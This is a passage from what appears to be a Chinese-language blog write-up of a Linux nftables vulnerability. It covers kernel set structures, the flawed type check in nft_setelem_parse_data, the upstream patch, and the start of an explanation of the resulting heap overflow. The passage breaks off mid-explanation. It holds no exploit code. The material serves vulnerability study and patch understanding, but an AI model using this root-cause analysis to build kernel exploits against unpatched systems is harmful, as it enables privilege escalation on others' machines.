</span></span><span style=display:flex><span>      chain <span style=color:#666>=</span> <span style=color:#06287e>nft_chain_lookup_byid</span>(ctx<span style=color:#666>-&gt;</span>net,
</span></span><span style=display:flex><span>                                    tb[NFTA_VERDICT_CHAIN_ID]);
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>IS_ERR</span>(chain))
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>PTR_ERR</span>(chain);
</span></span><span style=display:flex><span>    } <span style=color:#007020;font-weight:700>else</span> {
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>EINVAL;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>IS_ERR</span>(chain))
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>PTR_ERR</span>(chain);
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>nft_is_base_chain</span>(chain))
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>EOPNOTSUPP;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    chain<span style=color:#666>-&gt;</span>use<span style=color:#666>++</span>;
</span></span><span style=display:flex><span>    data<span style=color:#666>-&gt;</span>verdict.chain <span style=color:#666>=</span> chain;
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>break</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  desc<span style=color:#666>-&gt;</span>len <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(data<span style=color:#666>-&gt;</span>verdict);
</span></span><span style=display:flex><span>  desc<span style=color:#666>-&gt;</span>type <span style=color:#666>=</span> NFT_DATA_VERDICT;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>具体如何实现的，这里就不在赘述了，总的就是处理一些特殊的 verdict code 的初始化（比如 NFT_GOTO 和 NFT_JUMP 需要找到目标的 chain 的地址）</p><h3 id=nft-set-ext><span class=section-num>3.2</span> <code>nft_set_ext</code></h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	struct nft_set_ext - set extensions
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@genmask: generation mask
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@offset: offsets of individual extension types
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@data: beginning of extension data
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nft_set_ext {
</span></span><span style=display:flex><span>        u8	genmask;
</span></span><span style=display:flex><span>        u8	offset[NFT_SET_EXT_NUM];
</span></span><span style=display:flex><span>        <span style=color:#902000>char</span>	data[];
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>这是一个 nftables 在内核中用于表示 set 中元素的扩展属性的结构体。总共有这些扩展属性：</p><p><a id="code-snippet--enum nft-set-extensions"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	enum nft_set_extensions - set extension type IDs
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@NFT_SET_EXT_KEY: element key
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@NFT_SET_EXT_KEY_END: upper bound element key, for ranges
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@NFT_SET_EXT_DATA: mapping data
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@NFT_SET_EXT_FLAGS: element flags
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@NFT_SET_EXT_TIMEOUT: element timeout
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@NFT_SET_EXT_EXPIRATION: element expiration time
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@NFT_SET_EXT_USERDATA: user data associated with the element
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@NFT_SET_EXT_EXPRESSIONS: expressions assiciated with the element
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@NFT_SET_EXT_OBJREF: stateful object reference associated with element
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@NFT_SET_EXT_NUM: number of extension types
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>enum</span> nft_set_extensions {
</span></span><span style=display:flex><span>        NFT_SET_EXT_KEY,
</span></span><span style=display:flex><span>        NFT_SET_EXT_KEY_END,
</span></span><span style=display:flex><span>        NFT_SET_EXT_DATA,
</span></span><span style=display:flex><span>        NFT_SET_EXT_FLAGS,
</span></span><span style=display:flex><span>        NFT_SET_EXT_TIMEOUT,
</span></span><span style=display:flex><span>        NFT_SET_EXT_EXPIRATION,
</span></span><span style=display:flex><span>        NFT_SET_EXT_USERDATA,
</span></span><span style=display:flex><span>        NFT_SET_EXT_EXPRESSIONS,
</span></span><span style=display:flex><span>        NFT_SET_EXT_OBJREF,
</span></span><span style=display:flex><span>        NFT_SET_EXT_NUM
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>他的存储方式是对于每个属性，用 <code>offset</code> 数组中的一个项来保存其偏移。然后在 <code>data</code> 数组中存储其具体数据。（nftables 中许多数据结构都是这么存储的）</p><figure><img src=https://raw.githubusercontent.com/chujDK/ImageHost/main/PicGoIMage/202303020018939-nft-set-ext.png></figure><h3 id=nft-set-ext-tmpl><span class=section-num>3.3</span> <code>nft_set_ext_tmpl</code></h3><p><a id=code-snippet--nft-set-ext-tmpl></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	struct nft_set_ext_tmpl - set extension template
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@len: length of extension area
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@offset: offsets of individual extension types
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nft_set_ext_tmpl {
</span></span><span style=display:flex><span>        u16	len;
</span></span><span style=display:flex><span>        u8	offset[NFT_SET_EXT_NUM];
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>这个结构体和上面说的 <code>nft_set_ext</code> 联系紧密，由于 <code>nft_set_ext->data</code> 这个字段是不定长的，而我们不可能在 parse 完所有的属性前就知道 data 的大小，所以无法提前先申请出合适大小的内存空间。所以需要用这个 <code>nft_set_ext_tmpl</code> 先保存下来所有的偏移，并且维护 <code>nft_set_ext</code> 的大小</p><p>所以最后 <code>nft_set_ext</code> 可以根据 <code>nft_set_ext_tmpl</code> 的 <code>len</code> 字段来申请合适的空间，这个过程由 <code>nft_set_elem_init</code> 和 <code>nft_set_elem_ext</code> 共同实现</p><p><a id=code-snippet--nft-set-elem-init></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#666>*</span><span style=color:#06287e>nft_set_elem_init</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nft_set <span style=color:#666>*</span>set,
</span></span><span style=display:flex><span>                        <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nft_set_ext_tmpl <span style=color:#666>*</span>tmpl,
</span></span><span style=display:flex><span>                        <span style=color:#007020;font-weight:700>const</span> u32 <span style=color:#666>*</span>key, <span style=color:#007020;font-weight:700>const</span> u32 <span style=color:#666>*</span>key_end,
</span></span><span style=display:flex><span>                        <span style=color:#007020;font-weight:700>const</span> u32 <span style=color:#666>*</span>data, u64 timeout, u64 expiration, <span style=color:#902000>gfp_t</span> gfp)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> nft_set_ext <span style=color:#666>*</span>ext;
</span></span><span style=display:flex><span>        <span style=color:#902000>void</span> <span style=color:#666>*</span>elem;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        elem <span style=color:#666>=</span> <span style=color:#06287e>kzalloc</span>(set<span style=color:#666>-&gt;</span>ops<span style=color:#666>-&gt;</span>elemsize <span style=color:#666>+</span> tmpl<span style=color:#666>-&gt;</span>len, gfp);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (elem <span style=color:#666>==</span> <span style=color:#007020>NULL</span>)
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ext <span style=color:#666>=</span> <span style=color:#06287e>nft_set_elem_ext</span>(set, elem);
</span></span><span style=display:flex><span>        <span style=color:#06287e>nft_set_ext_init</span>(ext, tmpl);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#06287e>memcpy</span>(<span style=color:#06287e>nft_set_ext_key</span>(ext), key, set<span style=color:#666>-&gt;</span>klen);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>nft_set_ext_exists</span>(ext, NFT_SET_EXT_KEY_END))
</span></span><span style=display:flex><span>                <span style=color:#06287e>memcpy</span>(<span style=color:#06287e>nft_set_ext_key_end</span>(ext), key_end, set<span style=color:#666>-&gt;</span>klen);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>nft_set_ext_exists</span>(ext, NFT_SET_EXT_DATA))
</span></span><span style=display:flex><span>                <span style=color:#06287e>memcpy</span>(<span style=color:#06287e>nft_set_ext_data</span>(ext), data, set<span style=color:#666>-&gt;</span>dlen);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>nft_set_ext_exists</span>(ext, NFT_SET_EXT_EXPIRATION)) {
</span></span><span style=display:flex><span>                <span style=color:#666>*</span><span style=color:#06287e>nft_set_ext_expiration</span>(ext) <span style=color:#666>=</span> <span style=color:#06287e>get_jiffies_64</span>() <span style=color:#666>+</span> expiration;
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>if</span> (expiration <span style=color:#666>==</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>                        <span style=color:#666>*</span><span style=color:#06287e>nft_set_ext_expiration</span>(ext) <span style=color:#666>+=</span> timeout;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>nft_set_ext_exists</span>(ext, NFT_SET_EXT_TIMEOUT))
</span></span><span style=display:flex><span>                <span style=color:#666>*</span><span style=color:#06287e>nft_set_ext_timeout</span>(ext) <span style=color:#666>=</span> timeout;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> elem;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><a id=code-snippet--nft-set-elem-ext></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#007020;font-weight:700>struct</span> nft_set_ext <span style=color:#666>*</span><span style=color:#06287e>nft_set_elem_ext</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nft_set <span style=color:#666>*</span>set,
</span></span><span style=display:flex><span>                                                   <span style=color:#902000>void</span> <span style=color:#666>*</span>elem)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> elem <span style=color:#666>+</span> set<span style=color:#666>-&gt;</span>ops<span style=color:#666>-&gt;</span>elemsize;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>每个 set 的扩展属性存储在 <code>nft_set_elem</code> 的 priv 字段指向的内存块中。这个内存块中同时还要存储 elem ，结构大致如下</p><figure><img src=https://raw.githubusercontent.com/chujDK/ImageHost/main/PicGoIMage/202303031331016-nft_set_elem_priv.png></figure><p>对 <code>nft_set_ext</code> 的 len 字段的更新是通过 <code>nft_set_ext_add_length</code> 实现的</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#902000>void</span> <span style=color:#06287e>nft_set_ext_add_length</span>(<span style=color:#007020;font-weight:700>struct</span> nft_set_ext_tmpl <span style=color:#666>*</span>tmpl, u8 id,
</span></span><span style=display:flex><span>                                          <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> len)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        tmpl<span style=color:#666>-&gt;</span>len	 <span style=color:#666>=</span> <span style=color:#06287e>ALIGN</span>(tmpl<span style=color:#666>-&gt;</span>len, nft_set_ext_types[id].align);
</span></span><span style=display:flex><span>        <span style=color:#06287e>BUG_ON</span>(tmpl<span style=color:#666>-&gt;</span>len <span style=color:#666>&gt;</span> U8_MAX);
</span></span><span style=display:flex><span>        tmpl<span style=color:#666>-&gt;</span>offset[id] <span style=color:#666>=</span> tmpl<span style=color:#666>-&gt;</span>len;
</span></span><span style=display:flex><span>        tmpl<span style=color:#666>-&gt;</span>len	<span style=color:#666>+=</span> nft_set_ext_types[id].len <span style=color:#666>+</span> len;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=nft-set><span class=section-num>3.4</span> <code>nft_set</code></h3><p>在内核中表示一个 set 数据结构的结构体</p><p><a id="code-snippet--struct nft-set"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nft_set {
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> list_head		list;
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> list_head		bindings;
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> nft_table		<span style=color:#666>*</span>table;
</span></span><span style=display:flex><span>        <span style=color:#902000>possible_net_t</span>			net;
</span></span><span style=display:flex><span>        <span style=color:#902000>char</span>				<span style=color:#666>*</span>name;
</span></span><span style=display:flex><span>        u64				handle;
</span></span><span style=display:flex><span>        u32				ktype;
</span></span><span style=display:flex><span>        u32				dtype;
</span></span><span style=display:flex><span>        u32				objtype;
</span></span><span style=display:flex><span>        u32				size;
</span></span><span style=display:flex><span>        u8				field_len[NFT_REG32_COUNT];
</span></span><span style=display:flex><span>        u8				field_count;
</span></span><span style=display:flex><span>        u32				use;
</span></span><span style=display:flex><span>        <span style=color:#902000>atomic_t</span>			nelems;
</span></span><span style=display:flex><span>        u32				ndeact;
</span></span><span style=display:flex><span>        u64				timeout;
</span></span><span style=display:flex><span>        u32				gc_int;
</span></span><span style=display:flex><span>        u16				policy;
</span></span><span style=display:flex><span>        u16				udlen;
</span></span><span style=display:flex><span>        <span style=color:#902000>unsigned</span> <span style=color:#902000>char</span>			<span style=color:#666>*</span>udata;
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>/* runtime data below here */</span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nft_set_ops	<span style=color:#666>*</span>ops ____cacheline_aligned;
</span></span><span style=display:flex><span>        u16				<span style=color:#002070;font-weight:700>flags</span>:<span style=color:#40a070>14</span>,
</span></span><span style=display:flex><span>                                        <span style=color:#002070;font-weight:700>genmask</span>:<span style=color:#40a070>2</span>;
</span></span><span style=display:flex><span>        u8				klen;
</span></span><span style=display:flex><span>        u8				dlen;
</span></span><span style=display:flex><span>        u8				num_exprs;
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> nft_expr			<span style=color:#666>*</span>exprs[NFT_SET_EXPR_MAX];
</span></span><span style=display:flex><span>        <span style=color:#902000>unsigned</span> <span style=color:#902000>char</span>			data[]
</span></span><span style=display:flex><span>                <span style=color:#06287e>__attribute__</span>((<span style=color:#06287e>aligned</span>(<span style=color:#06287e>__alignof__</span>(u64))));
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>注释中解释了每个元素的作用：</p><p><a id="code-snippet--comment of nft-set"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * 	struct nft_set - nf_tables set instance
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@list: table set list node
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@bindings: list of set bindings
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@table: table this set belongs to
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@net: netnamespace this set belongs to
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * 	@name: name of the set
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@handle: unique handle of the set
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * 	@ktype: key type (numeric type defined by userspace, not used in the kernel)
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * 	@dtype: data type (verdict or numeric type defined by userspace)
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * 	@objtype: object type (see NFT_OBJECT_* definitions)
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * 	@size: maximum set size
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@field_len: length of each field in concatenation, bytes
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@field_count: number of concatenated fields in element
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@use: number of rules references to this set
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * 	@nelems: number of elements
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * 	@ndeact: number of deactivated elements queued for removal
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@timeout: default timeout value in jiffies
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * 	@gc_int: garbage collection interval in msecs
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@policy: set parameterization (see enum nft_set_policies)
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@udlen: user data length
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@udata: user data
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@expr: stateful expression
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * 	@ops: set ops
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * 	@flags: set flags
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@genmask: generation mask
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * 	@klen: key length
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * 	@dlen: data length
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * 	@data: private set data
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span></code></pre></div><h2 id=漏洞分析><span class=section-num>4</span> 漏洞分析</h2><p>漏洞出现在 <code>nftables</code> 的 <code>NFT_MSG_NEWSETELEM</code> 方法中，这是对 <code>nftables</code> 的内建 set 数据结构的操作，具体可见 <a href=https://wiki.nftables.org/wiki-nftables/index.php/Sets>wiki</a> 。这个 set 类似于是一个键-元素集合对，这个元素集合里面可以存储各种类型的数据，高度灵活。比如 wiki 里面的例子：</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>nft add <span style=color:#007020>set</span> ip filter blackhole <span style=color:#666>{</span> <span style=color:#007020>type</span> ipv4_addr<span style=color:#4070a0;font-weight:700>\;</span> comment <span style=color:#4070a0;font-weight:700>\&#34;</span>drop all packets from these hosts<span style=color:#4070a0;font-weight:700>\&#34;</span> <span style=color:#4070a0;font-weight:700>\;</span> <span style=color:#666>}</span>
</span></span></code></pre></div><p>如上就可以创建一个 named set ，规定了每个元素的类型。然后通过</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>nft add element ip filter blackhole <span style=color:#666>{</span> 192.168.3.4 <span style=color:#666>}</span>
</span></span></code></pre></div><p>就可以向 set 中添加元素。在使用 rule 的时候也可以引用它</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>nft add rule ip filter input ip saddr @blackhole drop
</span></span></code></pre></div><p>有了上面对 nftables 中结构体的介绍，理解这个漏洞应该并不难。首先要知道的是，nftables 中的 set ，虽然可以存储各种各样不同类型的元素集合，但是集合内的元素类型都一定相同。为了便于理解，可以不严谨得认为这是一个 C++ 中的 vector 这样的数据类型，即泛型，可变长的数组。如果在实现时出现了疏漏，导致一个 set 可以被存储不同类型（或者说不同大小）的数据，就可能会导致越界。</p><p>然而在 <code>nft_setelem_parse_data</code> 中就存在对类型判断的疏忽</p><p><a id=code-snippet--nft-setelem-parse-data></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>int</span> <span style=color:#06287e>nft_setelem_parse_data</span>(<span style=color:#007020;font-weight:700>struct</span> nft_ctx <span style=color:#666>*</span>ctx, <span style=color:#007020;font-weight:700>struct</span> nft_set <span style=color:#666>*</span>set,
</span></span><span style=display:flex><span>                                  <span style=color:#007020;font-weight:700>struct</span> nft_data_desc <span style=color:#666>*</span>desc,
</span></span><span style=display:flex><span>                                  <span style=color:#007020;font-weight:700>struct</span> nft_data <span style=color:#666>*</span>data,
</span></span><span style=display:flex><span>                                  <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>attr)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> err;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        err <span style=color:#666>=</span> <span style=color:#06287e>nft_data_init</span>(ctx, data, NFT_DATA_VALUE_MAXLEN, desc, attr);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (err <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> err;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (desc<span style=color:#666>-&gt;</span>type <span style=color:#666>!=</span> NFT_DATA_VERDICT <span style=color:#666>&amp;&amp;</span> desc<span style=color:#666>-&gt;</span>len <span style=color:#666>!=</span> set<span style=color:#666>-&gt;</span>dlen) {
</span></span><span style=display:flex><span>                <span style=color:#06287e>nft_data_release</span>(data, desc<span style=color:#666>-&gt;</span>type);
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>EINVAL;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>这里会先通过之前说过 <code>nft_data_init</code> 初始化 <code>data</code> 和 <code>desc</code> 。完成初始化之后使用 <code>desc</code> 做合法性检查， <code>set->dlen</code> 保存的是这个 set 中每个元素的大小，检查的本意是如果传入的数据是 VALUE 类型的话就检查一下传入的数据大小是否和 <code>set->dlen</code> 相等，如果不等就代表传入的数据类型和 set 的类型不同，这个是合理的。但是他却忘了存在传入的是 VERDICT 类型，而 set 存储的是 VALUE 类型的这种情况。如果是这样的话，这个检查就无效了，我们就可以把一个 VERDICT 存到一个 VALUE set 里面了。</p><p>所以 <a href=https://github.com/torvalds/linux/commit/7e6bc1f6cab.diff>patch</a> 就是加上这部分的类型检查</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span><span style=color:navy;font-weight:700>diff --git a/net/netfilter/nf_tables_api.c b/net/netfilter/nf_tables_api.c
</span></span></span><span style=display:flex><span><span style=color:navy;font-weight:700>index 51144fc66889b5..d6b59beab3a986 100644
</span></span></span><span style=display:flex><span><span style=color:navy;font-weight:700></span><span style=color:#a00000>--- a/net/netfilter/nf_tables_api.c
</span></span></span><span style=display:flex><span><span style=color:#a00000></span><span style=color:#00a000>+++ b/net/netfilter/nf_tables_api.c
</span></span></span><span style=display:flex><span><span style=color:#00a000></span><span style=color:purple;font-weight:700>@@ -5213,13 +5213,20 @@ static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
</span></span></span><span style=display:flex><span><span style=color:purple;font-weight:700></span>                                  struct nft_data *data,
</span></span><span style=display:flex><span>                                  struct nlattr *attr)
</span></span><span style=display:flex><span> {
</span></span><span style=display:flex><span><span style=color:#00a000>+	u32 dtype;
</span></span></span><span style=display:flex><span><span style=color:#00a000></span>        int err;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        err = nft_data_init(ctx, data, NFT_DATA_VALUE_MAXLEN, desc, attr);
</span></span><span style=display:flex><span>        if (err &lt; 0)
</span></span><span style=display:flex><span>                return err;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a00000>-	if (desc-&gt;type != NFT_DATA_VERDICT &amp;&amp; desc-&gt;len != set-&gt;dlen) {
</span></span></span><span style=display:flex><span><span style=color:#a00000></span><span style=color:#00a000>+	if (set-&gt;dtype == NFT_DATA_VERDICT)
</span></span></span><span style=display:flex><span><span style=color:#00a000>+		dtype = NFT_DATA_VERDICT;
</span></span></span><span style=display:flex><span><span style=color:#00a000>+	else
</span></span></span><span style=display:flex><span><span style=color:#00a000>+		dtype = NFT_DATA_VALUE;
</span></span></span><span style=display:flex><span><span style=color:#00a000>+
</span></span></span><span style=display:flex><span><span style=color:#00a000>+	if (dtype != desc-&gt;type ||
</span></span></span><span style=display:flex><span><span style=color:#00a000>+	    set-&gt;dlen != desc-&gt;len) {
</span></span></span><span style=display:flex><span><span style=color:#00a000></span>                nft_data_release(data, desc-&gt;type);
</span></span><span style=display:flex><span>                return -EINVAL;
</span></span><span style=display:flex><span>        }
</span></span></code></pre></div><p>根据 nftables 对 set 的实现，这个问题会造成一个堆溢出。过程如下：</p><ol><li>在 <code>nft_setelem_parse_data</code> 中，如果允许添加这个被 parse 的 data，就会传回一个对要被添加的数据的 <code>desc</code> ，该结构体的 <code>len</code> 字段保存了该元素的大小</li><li><code>nft_set_ext_add_length</code> 会使用传回的 desc 的 <code>len</code> 字段来更新 <code>nft_set_ext_tmpl tmpl</code> 结构体</li><li>在 <code>nft_add_set_elem</code> 函数处理完传入的 <code>nlattr</code> （属性流）后， <code>nft_set_ext_tmpl tmpl</code> 也就被更新完毕了， <code>nft_set_elem_init</code> 会根据这个结构体创建并初始化一个 <code>nft_set_elem</code> 的 private data 部分
<a id=code-snippet--nft-set-elem-init></a><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#666>*</span><span style=color:#06287e>nft_set_elem_init</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nft_set <span style=color:#666>*</span>set,
